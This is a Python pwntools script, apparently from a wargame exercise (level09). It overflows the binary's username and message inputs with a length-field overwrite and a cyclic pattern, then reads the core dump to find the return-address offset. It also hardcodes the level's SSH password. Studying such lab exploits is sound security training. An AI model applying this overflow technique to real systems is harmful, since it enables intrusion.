#!/usr/bin/env python3
from pwn import *
import base64
import os


# Configuration
context.arch = 'amd64'  # Architecture du binaire (64-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = True  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8881  # Port pour SSH
USER = "level09"  # Nom d'utilisateur SSH
PASSWORD = "fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S"  # Mot de passe SSH
SSH_SESSION = None


def get_connection(custom_env=None, argv=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        final_argv = argv if argv is not None else ['./Resources/' + USER]
        return process(final_argv, env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)

        # Fusionner avec nos variables personnalisées 
        final_env = merge_env(remote_env_dict, custom_env)
        final_argv = argv if argv is not None else ['/home/users/' + USER + '/' + USER]
        log.info(f"Final argv: {final_argv}")
        return shell.process(final_argv, env=final_env)


def exploit():

    size_msg = 500

    cyclic_pattern = cyclic_gen(string.ascii_uppercase, n=8)
    payload_arg1 = b"A" * 40 + p32(500)

    payload_arg2 = cyclic_pattern.get(500)

    if LOCAL:

        final_argv = ['./Resources/' + USER]
        conn = gdb.debug(final_argv, '''
          break *set_username+207
          b *set_msg+125
          continue
          ''')
    else:
        conn = get_connection()

    # Consommer le message de bienvenue (3 lignes)
    print(conn.recvline())  # "--------------------------------------------"
    print(conn.recvline())  # "|   ~Welcome to l33t-m$n ~    v1337        |"
    print(conn.recvline())  # "--------------------------------------------"
    
    # Attendre "Enter your username" puis consommer jusqu'au prompt
    print(conn.recvuntil(b'Enter your username'))
    print(conn.recvline())  # Consommer le newline après "Enter your username"
    # Le prompt ">>: " suit directement, on peut l'envoyer maintenant
    conn.sendline(payload_arg1)
    print(payload_arg1)
    
    # Attendre "Welcome" puis "Msg @Unix-Dude"
    print(conn.recvuntil(b'Msg @Unix-Dude'))
    print(conn.recvline())  # Consommer le newline après "Msg @Unix-Dude"
    # Le prompt ">>: " suit directement
    conn.sendline(payload_arg2)
    print(payload_arg2)
    
    # Attendre la fin du programme (crash)
    try:
        conn.recvall()
    except:
        pass
    
    # Attendre que le processus se termine
    conn.wait()
    
    # Récupérer le core dump pour accéder aux registres
    if conn.corefile:
        core = conn.corefile
        rip_value = core.rip
        rsp_value = core.rsp

        log.info(f"RIP après le crash: {hex(rip_value)}")
        log.info(f"RIP (décimal): {rip_value}")
        log.info(f"RSP: {hex(rsp_value)}")
        log.info(f"RBP: {hex(core.rbp)}")
        log.info(f"RAX: {hex(core.rax)}")

        # Il faut regarder ce sur quoi rsp pointe (la valeur à l'adresse rsp)
        try:
            value_at_rsp = core.read(rsp_value, 8)
            log.info(f"Valeur à l'adresse RSP ({hex(rsp_value)}): {value_at_rsp.hex()} ({value_at_rsp})")
            # Si on utilise un pattern cyclique, voir si cela correspond à une partie du pattern
            offset_rsp = cyclic_pattern.find(value_at_rsp)
            if offset_rsp != -1:
                log.info(f"Offset trouvé dans le pattern à RSP: {offset_rsp}")
        except Exception as e:
            log.warning(f"Impossible de lire la mémoire à RSP: {e}")

    
    else:
        log.warning("Aucun core dump disponible")






   
if __name__ == "__main__":
    exploit()


